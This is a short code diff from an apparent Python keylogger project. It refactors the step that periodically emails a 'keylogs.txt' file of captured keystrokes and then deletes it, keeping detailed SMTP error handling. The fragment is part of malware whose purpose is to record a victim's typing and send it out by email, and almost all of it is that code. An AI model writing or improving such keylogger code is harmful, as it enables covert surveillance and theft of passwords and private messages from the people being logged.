@@ -23,22 +23,21 @@ class keylogger:
             keylogFile.write(format)
 
         if (time.time() - self.start_time) > self.emailInterval:
-            with open("keylogs.txt", "r") as keylogFile:
-                try:
-                    keylogger.send_email(self)
-                    print("Email sent successfully!")
-                except smtplib.SMTPServerDisconnected:
-                    print("Error: The server unexpectedly disconnected!")
-                except smtplib.SMTPSenderRefused:
-                    print("Error: Sender address refused.")
-                except smtplib.SMTPDataError:
-                    print("Error: The SMTP server refused to accept the message data.")
-                except smtplib.SMTPConnectError:
-                    print("Error: Failed to establish a connection with the server.")
-                except smtplib.SMTPAuthenticationError:
-                    print("Error: SMTP authentication went wrong. Most probably the server did not accept the username/password combination provided.")
-                except Exception as e:
-                    print(e)
+            try:
+                keylogger.send_email(self)
+                print("Email sent successfully!")
+            except smtplib.SMTPServerDisconnected:
+                print("Error: The server unexpectedly disconnected!")
+            except smtplib.SMTPSenderRefused:
+                print("Error: Sender address refused.")
+            except smtplib.SMTPDataError:
+                print("Error: The SMTP server refused to accept the message data.")
+            except smtplib.SMTPConnectError:
+                print("Error: Failed to establish a connection with the server.")
+            except smtplib.SMTPAuthenticationError:
+                print("Error: SMTP authentication went wrong. Most probably the server did not accept the username/password combination provided.")
+            except Exception as e:
+                print(e)
 
             os.remove("keylogs.txt")
             self.start_time = time.time()
